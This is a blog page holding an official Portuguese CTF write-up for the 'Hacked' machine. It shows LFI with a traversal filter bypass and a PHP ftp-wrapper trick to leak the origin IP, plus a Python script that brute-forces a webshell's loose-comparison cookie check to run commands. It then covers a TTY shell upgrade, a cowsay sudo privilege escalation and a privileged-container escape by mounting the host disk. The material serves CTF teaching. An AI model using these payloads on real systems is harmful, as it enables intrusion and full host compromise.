<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>UHCCTF (Classificat√≥ria) - Hacked (Official Write-Up) | big0us</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="UHCCTF (Classificat√≥ria) - Hacked (Official Write-Up)" />
<meta name="author" content="Vinicius Pereira" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
<meta property="og:description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
<meta property="og:site_name" content="big0us" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-06-02T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UHCCTF (Classificat√≥ria) - Hacked (Official Write-Up)" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"Vinicius Pereira"},"description":"Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.","headline":"UHCCTF (Classificat√≥ria) - Hacked (Official Write-Up)","dateModified":"2021-06-02T00:00:00+00:00","url":"/2021/06/02/uhc-hacked.html","datePublished":"2021-06-02T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/06/02/uhc-hacked.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="big0us" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">big0us<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/big0x75"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-blue-hover" href="https://linkedin.com/in/viniciuspereiras"><i class="fab fa-linkedin"></i></a>
        
        
        
        <a class="color-pink-hover" href="https://github.com/viniciuspereiras"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    /assets/avatar.gif
" class="author-avatar" alt="Avatar" />
<div class="description">Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.
</div>

</div>


<div class="post">
  <h1 class="post-title">UHCCTF (Classificat√≥ria) - Hacked (Official Write-Up)</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/pt-br/">pt-br</a>
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/write-up/">write-up</a>
      
  </div>
  
  <div class="post-date">Published on 02 Jun 2021</div>
  
  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>

<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-72MZ89K41P');
</script>

<p>Essa m√°quina foi feita por mim com ajuda dos meus amigos Luska e Kadu para o UHC. Os arquivos dela e o Dockerfile estar√£o no meu GitHub.</p>

<h1 id="recon">Recon</h1>

<p>A primeira p√°gina √© uma linda arte (uma deface), dizendo que o site foi hackeado:</p>

<p><img src="/assets/hacked/Untitled.png" alt="/assets/hacked/Untitled.png" /></p>

<p>Logo de cara temos uma flag, essa eu n√£o censurei pois √© literalmente abrir o site. Lendo o source code da p√°gina n√£o encontrei nada, como esse arquivo deve ser o index vamos rodar um fuzzing no site para achar mais arquivos e diret√≥rios. Utilizei o ffuf com as wordlists do <a href="https://github.com/danielmiessler/SecLists">seclists</a>.</p>

<p>common.txt:</p>

<p><img src="/assets/hacked/Untitled%201.png" alt="/assets/hacked/Untitled%201.png" /></p>

<p>De costume vou testar esse /uploads/, mas deu 404 üò¢</p>

<p>raft-small-files.txt:</p>

<p><img src="/assets/hacked/Untitled%202.png" alt="/assets/hacked/Untitled%202.png" /></p>

<p>Parece que encontramos um tamb√©m ‚Äúhome.php‚Äù vamos dar uma olhada:</p>

<p><img src="/assets/hacked/Untitled%203.png" alt="/assets/hacked/Untitled%203.png" /></p>

<p>Um site sobre customiza√ß√£o de carros, vamos dar uma navegada no site para ver se encontramos algo interessante:</p>

<p>Logo percebemos que quando clicamos nos bot√µes ali no cabe√ßalho n√£o somos redirecionados para a p√°gina deles, e sim a p√°gina deles √© ‚Äúinclu√≠da‚Äù  em um par√¢metro GET no home.php:</p>

<p><img src="/assets/hacked/Untitled%204.png" alt="/assets/hacked/Untitled%204.png" /></p>

<p>Isso parece estar vulner√°vel a Local File Inclusion (LFI), uma vulnerabilidade que permite ao atacante incluir ou ler arquivos do servidor‚Ä¶</p>

<p>(Agora vai ter uma divis√£o no write-up para voc√™ que fez a m√°quina no dia do uhc ou no UHCLABS ou se voc√™ estiver rodando no docker. Se voc√™ estiver no docker ou localmente sem nenhum WAF √© s√≥ pular a pr√≥xima parte ‚ÄúWAF bypass‚Äù)</p>

<h1 id="exploitation">Exploitation</h1>
<h2 id="lfi">LFI</h2>

<p>No UHC havia um WAF do cloudfare, e isso impossibilitou ler arquivos do servidor completamente, ent√£o vamos seguir com a explora√ß√£o do nosso LFI, vamos fazer um teste tentando incluir o nosso home.php alterando a URL para: (apenas home pois nas outras p√°ginas ele auto completa o .php):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://hacked.uhclabs.com/home.php?page<span class="o">=</span>home
</code></pre></div></div>

<p><img src="/assets/hacked/Untitled%205.png" alt="/assets/hacked/Untitled%205.png" /></p>

<p><img src="/assets/hacked/Untitled%206.png" alt="/assets/hacked/Untitled%206.png" /></p>

<p>A p√°gina ficou duplicada, e no source podemos comprovar isso, por√©m, se a p√°gina √© um php que inclui outras p√°ginas, onde est√° as tags php e o c√≥digo php para n√≥s vermos como isso funciona?</p>

<p>Ai √© que est√° o WAF (Web Application Firewall) est√° omitindo o c√≥digo php do nosso arquivo. Ent√£o teremos de fazer um Bypass do WAF e acessar diretamente o ip do servidor, e para isso vamos aproveitar nosso LFI.</p>

<h3 id="exploitation-bypass-waf">Exploitation Bypass WAF</h3>

<p>Para explorar esse bypass utilizaremos os wrappers do php. (<a href="https://www.php.net/manual/en/wrappers.php">https://www.php.net/manual/en/wrappers.php</a>)</p>

<p><img src="/assets/hacked/Untitled%207.png" alt="/assets/hacked/Untitled%207.png" /></p>

<p>Vamos usar o wrapper do ftp para fazer o site fazer uma requisi√ß√£o para o nosso IP como se fosse se conectar ao ftp assim nos indicando qual √© o IP real do servidor.</p>

<p>Na minha m√°quina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 4444
</code></pre></div></div>

<p>Payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://hacked.uhclabs.com/home.php?page=ftp://IP:PORT/x
</code></pre></div></div>

<p>Recebemos:</p>

<p><img src="/assets/hacked/Untitled%208.png" alt="/assets/hacked/Untitled%208.png" /></p>

<p>Esses servidores ec2 da amazom para pegar o ip √© s√≥ pegar esses n√∫meros da url: 34.219.224.183</p>

<p>Vamos acessar e rodar a inclus√£o do home.php e deve funcionar.</p>

<p><img src="/assets/hacked/Untitled%209.png" alt="/assets/hacked/Untitled%209.png" /></p>

<p>Apenas trocando a URL por home ele automaticamente adicionou o .php e nos mostrou o conte√∫do do arquivo home.php.</p>

<p>Lendo esse c√≥digo podemos perceber que ele tem algumas prote√ß√µes quanto a algumas coisas. Vamos tentar ler arquivos do servidor no caso o cl√°ssico /etc/passwd:</p>

<p>(../ serve para voltar diret√≥rios)</p>

<p><img src="/assets/hacked/Untitled%2010.png" alt="/assets/hacked/Untitled%2010.png" /></p>

<p><img src="/assets/hacked/Untitled%2011.png" alt="/assets/hacked/Untitled%2011.png" /></p>

<p>Pelo o que podemos ver retornou um erro, que podemos entender j√° que temos o c√≥digo. Da nossa payload ele retirou todos os ‚Äú../‚Äù e substituiu por ‚Äú‚Äù (nada) , ele retirou a palavra ‚Äúpasswd‚Äù e trocou por ‚ÄúERROR‚Äù e por fim adicionou ‚Äú.php‚Äù no final, logo o arquivo n√£o existe e ele n√£o mostra o conte√∫do.</p>

<p>Lendo o c√≥digo podemos ver que a prote√ß√£o de ‚Äú../‚Äù est√° vulner√°vel a um bypass que consiste em escrever uma palavra dentro da outra:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pal(palavra)avra -&gt; palpalavraavra
.(../)./ -&gt; ..././
</code></pre></div></div>

<p>Assim quando o c√≥digo retirar a primeira palavra ele vai concatenar a palavra proibida passando o que queremos.</p>

<p>Para bypassarmos o ERROR n√£o vamos conseguir, portando vamos ler outro arquivo que n√£o esteja na nossa blackllist como /etc/hosts.</p>

<p>Agora o .php no final, tem uma linha no c√≥digo que diz que se existir um par√¢metro GET chamado ‚Äúext‚Äù ele vai usar o que estiver nele para completar a extens√£o do arquivo, e se o par√¢metro n√£o estiver setado ele vai adicionar .php no final. Logo o que temos que fazer √© setar o par√¢metro ext para ‚Äú‚Äú(nada).</p>

<p>Vamos a payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>34.219.224.183/home.php?page=..././..././..././..././..././etc/hosts&amp;ext=
</code></pre></div></div>

<p>Conseguimos!</p>

<p><img src="/assets/hacked/Untitled%2012.png" alt="/assets/hacked/Untitled%2012.png" /></p>

<p>Bom agora parece que teremos que ler algum arquivo do servidor, poder√≠amos fazer um fuzzing usando o LFI ou refazer nosso fuzzing novamente e usar o LFI para ler os arquivos. Rodei a wordlist raft-large-words.txt com a extens√£o php. (Usei um filtro de tamanho do ffuf ‚Äú-fs 283‚Äù)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt <span class="nt">-u</span> <span class="s1">'https://hacked.uhclabs.com/uploads/FUZZ'</span> <span class="nt">-e</span> .php 
</code></pre></div></div>

<p><img src="/assets/hacked/Untitled%2013.png" alt="/assets/hacked/Untitled%2013.png" /></p>

<p>Parece que encontramos a webshell que o hacker usou para invadir esse sistema, vamos dar uma olhada nela e ao mesmo tempo usar o nosso LFI para ler ela. Opa achamos uma flag!</p>

<p><img src="/assets/hacked/Untitled%2014.png" alt="/assets/hacked/Untitled%2014.png" /></p>

<p><img src="/assets/hacked/Untitled%2015.png" alt="/assets/hacked/Untitled%2015.png" /></p>

<h1 id="exploitation-1">Exploitation</h1>
<h2 id="part2">Part2</h2>

<p>Pelo jeito √© uma webshell com senha:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$pass1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass1'</span><span class="p">];</span>
<span class="nv">$pass2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass2'</span><span class="p">];</span>
<span class="nv">$secret</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'../../secret'</span><span class="p">);</span> <span class="c1">// /var/www</span>
<span class="nv">$hmac_client</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$pass1</span><span class="p">,</span> <span class="nv">$pass2</span><span class="p">);</span>
<span class="nv">$hmac_server</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="s1">'Gu%40$!mN0123'</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">);</span>
<span class="nv">$hmac_server</span> <span class="o">=</span>  <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$hmac_server</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]){</span>
    <span class="nv">$hmac_client</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'token'</span><span class="p">];</span>
<span class="p">};</span> 

<span class="k">if</span><span class="p">(</span><span class="nv">$hmac_client</span> <span class="o">==</span> <span class="nv">$hmac_server</span><span class="p">)</span><span class="o">:</span>
    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'token'</span><span class="p">,</span> <span class="nv">$hmac_client</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Esse √© o c√≥digo, dando uma olhada ele faz uma hash usando a senha1(Gu%40$!mN0123) e a senha2 (conte√∫do do ../../secret), e ele compara essa hash com a hash feita com os valores que o usu√°rio passa via GET, por√©m existe um (int) que transforma a hash do servidor em um valor inteiro. Vamos reproduzir isso localmente‚Ä¶</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$secret</span> <span class="o">=</span> <span class="s2">"anything"</span><span class="p">;</span>
<span class="nv">$hmac_server</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="s1">'Gu%40$!mN0123'</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">"hash: "</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$hmac_server</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">" "</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"int: "</span><span class="p">;</span>
<span class="k">echo</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$hmac_server</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Retorna:</p>

<p><img src="/assets/hacked/Untitled%2016.png" alt="/assets/hacked/Untitled%2016.png" /></p>

<p>Aqui vemos como essa convers√£o da hash para um numero inteiro funciona, o php pega ent√£o os primeiros n√∫meros da hash com o (int) e compara com o valor passado pelo usu√°rio, outra coisa legal √© que o usu√°rio pode passar esse valor via COOKIE‚Ä¶, logo poderemos declarar nosso cookie ‚Äútoken‚Äù para algum n√∫mero inteiro e a compara√ß√£o ira dar TRUE.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nv">$hmac_client</span> <span class="o">==</span> <span class="nv">$hmac_server</span><span class="p">)</span><span class="o">:</span> <span class="c1">// vulnerable</span>
</code></pre></div></div>

<p>Vamos ent√£o encontrar um n√∫mero inteiro que consiga gerar TRUE na compara√ß√£o e bypassar a autentica√ß√£o da webshell. Podemos ver no c√≥digo que existe um par√¢metro POST chamado cmd que √© usado quando a autentica√ß√£o retorna TRUE , e esse par√¢metro √© o c√≥digo que ser√° executado na webshell. Pensando nisso escrevi um exploit em python para fazer um bruteforce de valores num√©ricos no cookie at√© conseguir a autentica√ß√£o e por fim rodar o comando que eu quiser na m√°quina.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">"http://34.219.224.183/uploads/webshell.php"</span>
<span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">num</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[INFO] Testing: "</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'token'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">token</span><span class="p">)}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">565</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"[EXPLOIT] Token:"</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="s">"CMD:"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
                <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'cmd'</span><span class="p">:</span> <span class="n">cmd</span><span class="p">}</span>
                <span class="n">a</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/hacked/Untitled%2017.png" alt="/assets/hacked/Untitled%2017.png" /></p>

<p>Funcionou o cookie que come√ßa com 9, mesmo ja tendo RCE,  vamos setar o cookie e ver a webshell‚Ä¶</p>

<p>Apenas setei o cookie para 9:</p>

<p><img src="/assets/hacked/Untitled%2018.png" alt="/assets/hacked/Untitled%2018.png" /></p>

<p>Uma webshell muito linda! Agora que temos RCE vamos pegar uma shell.</p>

<h1 id="exploitation-2">Exploitation</h1>
<h2 id="part3">Part3</h2>

<p>Habemos Shel!</p>

<p>Eu utilizei um site para pegar a shell por√©m, eu poderia ter usado tamb√©m o <a href="https://www.revshells.com/">https://www.revshells.com/</a> que √© um gerador de comandos, para pegar uma shell, eu apenas coloco as informa√ß√µes e ele gera a payload para eu mandar para o servidor üòâ.</p>

<p><img src="/assets/hacked/Untitled%2019.png" alt="/assets/hacked/Untitled%2019.png" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Full tty shell
in your rev-shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
in your terminal~ stty raw -echo; fg
ENTER
in your rev-shell~ export TERM=xterm
</code></pre></div></div>

<p>Fazendo um recon b√°sico com o ‚Äúsudo -l‚Äù podemos ver que conseguimos rodar um programa com um outro usu√°rio na maquina sem senha.</p>

<p><img src="/assets/hacked/Untitled%2020.png" alt="/assets/hacked/Untitled%2020.png" /></p>

<p>No caso o programa que podemos rodar √© o cowsay:</p>

<p><img src="/assets/hacked/Untitled%2021.png" alt="/assets/hacked/Untitled%2021.png" /></p>

<p>Dando uma olhada no <a href="https://gtfobins.github.io/gtfobins/cowsay/">GTFObins</a> podemos ver como funciona o priv esc utilizando o cowsay:</p>

<p><img src="/assets/hacked/Untitled%2022.png" alt="/assets/hacked/Untitled%2022.png" /></p>

<p><img src="/assets/hacked/Untitled%2023.png" alt="/assets/hacked/Untitled%2023.png" /></p>

<p>Basicamente o argumento -f no cowsay nos permite setar o ‚Äúestilo‚Äù da vaquinha, por√©m esse estilo √© um script em perl, logo podemos escrever um template malicioso e mandar o cowsay executar, agora vamos apenas fazer isso.</p>

<p><img src="/assets/hacked/Untitled%2024.png" alt="/assets/hacked/Untitled%2024.png" /></p>

<p>Agora como usu√°rio john rodando um ‚Äúls -la‚Äù na home dele podemos encontrar a pr√≥xima flag:</p>

<p><img src="/assets/hacked/Untitled%2025.png" alt="/assets/hacked/Untitled%2025.png" /></p>

<h1 id="exploitation-3">Exploitation</h1>
<h2 id="part4">Part4</h2>

<p>Rodando novamente o ‚Äúsudo -l‚Äù podemos rodar /bin/sh como root sem senha, ent√£o bora la pegar esse root!</p>

<p><img src="/assets/hacked/Untitled%2026.png" alt="/assets/hacked/Untitled%2026.png" /></p>

<p>U√©, cade a flag? Esse root n√£o foi muito facil?</p>

<p><img src="/assets/hacked/Untitled%2027.png" alt="/assets/hacked/Untitled%2027.png" /></p>

<p>Parece que estamos dentro de um docker e teremos que escapar dele, eu poderia testar algumas formas manuais de verificar como vamos fazer isso por√©m rodei uma tool chamada deepce que ja me deu uma dica de um poss√≠vel vetor de ataque‚Ä¶</p>

<p><img src="/assets/hacked/Untitled%2028.png" alt="/assets/hacked/Untitled%2028.png" /></p>

<p><img src="/assets/hacked/Untitled%2029.png" alt="/assets/hacked/Untitled%2029.png" /></p>

<p>Pelo jeito estamos em um container privilegiado, isso significa que podemos montar os arquivos do host dentro do nosso container ou at√© mesmo executar comandos no host.</p>

<p>Vamos rodar um: (Para visualizar os discos do servidor do host)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fdisk</span> <span class="o">-</span><span class="n">l</span>
</code></pre></div></div>

<p>E ent√£o montar o disco no nosso container:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mkdir</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">a</span>
<span class="n">mount</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">xvda1</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">a</span>
</code></pre></div></div>

<p>Agora vamos usar o chroot aonde montamos o disco:</p>

<p><img src="/assets/hacked/Untitled%2030.png" alt="/assets/hacked/Untitled%2030.png" /></p>

<p>E conseguimos! mais uma flag de brinde!</p>

<p>Espero que tenham gostado, para voc√™ que leu at√© aqui, obrigado!</p>

<p>H4ckTh3Pl4n3t!</p>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/10/07/latinoware2021-planilhasbaby.html">
            CTF LatinoWare 2021 - Planilhas Baby
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/04/uhc-cap.html">
            UHCCTF (Classificat√≥ria) - Cap
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/03/uhc-storm.html">
            UHCCTF (Classificat√≥ria) - Storm
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/eng/" class="set-1">eng</a> <a href="/tag/latinoware/" class="set-1">latinoware</a> <a href="/tag/pt-br/" class="set-5">pt-br</a> <a href="/tag/write-up/" class="set-5">write-up</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
